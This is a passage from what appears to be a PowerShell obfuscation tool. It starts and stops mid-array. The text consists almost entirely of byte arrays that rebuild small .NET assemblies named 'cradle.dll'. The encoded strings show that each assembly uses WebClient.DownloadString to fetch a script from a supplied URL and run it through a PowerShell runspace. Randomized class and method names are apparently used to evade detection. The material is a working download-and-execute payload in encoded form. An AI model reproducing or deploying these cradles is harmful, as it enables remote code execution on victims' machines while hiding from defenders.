83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,128,51)+@(0)*502","$CompiledHeader`216,38,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,238,36,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(160,36,0,0,75,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,244,4,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(208,36,0,0,0,0,0,0,72,0,0,0,2,0,5,0,156,32,0,0,4,4,0,0,1)+@(0)*55+@(19,48,3,0,54,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,111,9,0,0,10,38,7,111,10,0,0,10,38,42,30,2,40,11,0,0,10,42,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,100,1,0,0,35,126,0,0,208,1,0,0,168,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,120,3,0,0,8,0,0,0,35,85,83,0,128,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,144,3,0,0,116,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,9,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,11,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,46,0,39,0,6,0,103,0,71,0,6,0,135,0,71,0,10,0,240,0,201,0,10,0,0,1,201,0,10,0,29,1,172,0,14,0,71,1,60,1,6,0,137,1,106,1,10,0,150,1,172,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,53,0,10,0,1,0,146,32,0,0,0,0,134,24,61,0,15,0,2,0,0,0,1,0,67,0,17,0,61,0,19,0,25,0,61,0,15,0,33,0,9,1,33,0,41,0,24,1,15,0,49,0,40,1,38,0,49,0,47,1,43,0,57,0,61,0,15,0,57,0,81,1,49,0,49,0,96,1,54,0,49,0,159,1,60,0,9,0,61,0,15,0,46,0,11,0,76,0,46,0,19,0,85,0,69,0,4,128)+@(0)*16+@(165,0,0,0,4)+@(0)*11+@(1,0,30,0,0,0,0,0,3)+@(0)*11+@(24,0,172,0,0,0,0,0,4)+@(0)*11+@(1,0,39)+@(0)*8+@(0,0,60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,113,106,110,117,102,121,84,68,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,75,85,81,72,97,82,67,0,46,99,116,111,114,0,117,114,108,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,0,0,3,32,0,0,0,0,0,198,222,89,224,14,98,146,73,166,107,246,230,89,78,97,157,0,8,183,122,92,86,25,52,224,137,4,0,1,1,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,5,32,1,18,25,14,8,32,0,21,18,33,1,18,37,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,200,36)+@(0)*8+@(0,0,222,36,0,0,0,32)+@(0)*22+@(208,36)+@(0)*8+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*282+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,240,52)+@(0)*502","$CompiledHeader`17,39,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,62,37,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(228,36,0,0,87,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,68,5,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(32,37,0,0,0,0,0,0,72,0,0,0,2,0,5,0,168,32,0,0,60,4,0,0,1)+@(0)*55+@(19,48,4,0,65,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,114,1,0,0,112,3,40,9,0,0,10,111,10,0,0,10,38,7,111,11,0,0,10,38,42,30,2,40,12,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,116,1,0,0,35,126,0,0,224,1,0,0,200,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,168,3,0,0,8,0,0,0,35,85,83,0,176,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,192,3,0,0,124,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,10,0,0,0,2,0,0,0,2,0,0,0,2,0,0,0,12,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,46,0,39,0,6,0,121,0,89,0,6,0,153,0,89,0,10,0,2,1,219,0,10,0,18,1,219,0,10,0,47,1,190,0,14,0,89,1,78,1,6,0,114,1,39,0,6,0,169,1,138,1,10,0,182,1,190,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,53,0,10,0,1,0,157,32,0,0,0,0,134,24,61,0,16,0,3,0,0,0,1,0,67,0,0,0,2,0,71,0,17,0,61,0,20,0,25,0,61,0,16,0,33,0,27,1,34,0,41,0,42,1,16,0,49,0,58,1,39,0,49,0,65,1,44,0,57,0,61,0,16,0,57,0,99,1,50,0,65,0,121,1,55,0,49,0,128,1,62,0,49,0,191,1,68,0,9,0,61,0,16,0,46,0,11,0,84,0,46,0,19,0,93,0,77,0,4,128)+@(0)*16+@(183,0,0,0,4)+@(0)*11+@(1,0,30,0,0,0,0,0,3)+@(0)*11+@(25,0,190,0,0,0,0,0,4)+@(0)*11+@(1,0,39)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,113,106,110,117,102,121,84,68,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,75,85,81,72,97,82,67,0,46,99,116,111,114,0,117,114,108,0,112,111,115,116,99,114,97,100,108,101,99,111,109,109,97,110,100,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,83,116,114,105,110,103,0,67,111,110,99,97,116,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,0,0,3,59,0,0,0,0,0,236,32,248,73,235,122,164,71,181,243,19,99,224,195,10,157,0,8,183,122,92,86,25,52,224,137,5,0,2,1,14,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,6,0,3,14,14,14,14,5,32,1,18,25,14,8,32,0,21,18,37,1,18,41,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,12,37)+@(0)*8+@(0,0,46,37,0,0,0,32)+@(0)*22+@(32,37)+@(0)*20+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*202+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,64,53)+@(0)*502"))
    $LegitSoundingClassAndMethodCompiledRandom  += , @('UBmxNlngaz'    , 'VQAjUTwJ'          , @("$CompiledHeader`104,39,17,89)+@(0)*8+@(224,0,2,33,11,1,8,0,0,4,0,0,0,6,0,0,0,0,0,0,126,35,0,0,0,32,0,0,0,64,0,0,0,0,64,0,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(40,35,0,0,83,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,132,3,0,0,0,32,0,0,0,4,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,6)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,10)+@(0)*14+@(64,0,0,66)+@(0)*16+@(96,35,0,0,0,0,0,0,72,0,0,0,2,0,5,0,120,32,0,0,176,2,0,0,1)+@(0)*55+@(19,48,2,0,17,0,0,0,1,0,0,17,0,115,3,0,0,10,2,40,4,0,0,10,10,43,0,6,42,30,2,40,5,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,50,46,48,46,53,48,55,50,55,0,0,0,0,5,0,108,0,0,0,12,1,0,0,35,126,0,0,120,1,0,0,212,0,0,0,35,83,116,114,105,110,103,115,0,0,0,0,76,2,0,0,8,0,0,0,35,85,83,0,84,2,0,0,16,0,0,0,35,71,85,73,68,0,0,0,100,2,0,0,76,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,1,51,0,22,0,0,1,0,0,0,4,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,5,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,2,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,48,0,41,0,6,0,102,0,70,0,6,0,134,0,70,0,10,0,186,0,175,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,55,0,10,0,1,0,109,32,0,0,0,0,134,24,64,0,15,0,2,0,0,0,1,0,171,0,17,0,64,0,19,0,25,0,64,0,15,0,33,0,64,0,15,0,33,0,196,0,24,0,9,0,64,0,15,0,46,0,11,0,33,0,46,0,19,0,42,0,29,0,4,128)+@(0)*16+@(164,0,0,0,2)+@(0)*11+@(1,0,32,0,0,0,0,0,2)+@(0)*11+@(1,0,41)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,85,66,109,120,78,108,110,103,97,122,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,86,81,65,106,85,84,119,74,0,46,99,116,111,114,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,117,114,108,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,0,0,3,32,0,0,0,0,0,34,241,212,119,187,15,46,77,179,113,160,207,110,246,112,203,0,8,183,122,92,86,25,52,224,137,4,0,1,14,14,3,32,0,1,4,32,1,1,8,4,32,1,14,14,3,7,1,14,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,0,0,0,80,35)+@(0)*8+@(0,0,110,35,0,0,0,32)+@(0)*22+@(96,35)+@(0)*16+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,64)+@(0)*139+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,128,51)+@(0)*502","$CompiledHeader`146,39,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,254,36,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(164,36,0,0,87,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,4,5,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(224,36,0,0,0,0,0,0,72,0,0,0,2,0,5,0,156,32,0,0,8,4,0,0,1)+@(0)*55+@(19,48,3,0,54,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,111,9,0,0,10,38,7,111,10,0,0,10,38,42,30,2,40,11,0,0,10,42,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,100,1,0,0,35,126,0,0,208,1,0,0,172,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,124,3,0,0,8,0,0,0,35,85,83,0,132,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,148,3,0,0,116,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,9,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,11,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,48,0,41,0,6,0,106,0,74,0,6,0,138,0,74,0,10,0,243,0,204,0,10,0,3,1,204,0,10,0,32,1,175,0,14,0,74,1,63,1,6,0,140,1,109,1,10,0,153,1,175,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,55,0,10,0,1,0,146,32,0,0,0,0,134,24,64,0,15,0,2,0,0,0,1,0,70,0,17,0,64,0,19,0,25,0,64,0,15,0,33,0,12,1,33,0,41,0,27,1,15,0,49,0,43,1,38,0,49,0,50,1,43,0,57,0,64,0,15,0,57,0,84,1,49,0,49,0,99,1,54,0,49,0,162,1,60,0,9,0,64,0,15,0,46,0,11,0,76,0,46,0,19,0,85,0,69,0,4,128)+@(0)*16+@(168,0,0,0,4)+@(0)*11+@(1,0,32,0,0,0,0,0,3)+@(0)*11+@(24,0,175,0,0,0,0,0,4)+@(0)*11+@(1,0,41)+@(0)*8+@(0,0,60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,85,66,109,120,78,108,110,103,97,122,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,86,81,65,106,85,84,119,74,0,46,99,116,111,114,0,117,114,108,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,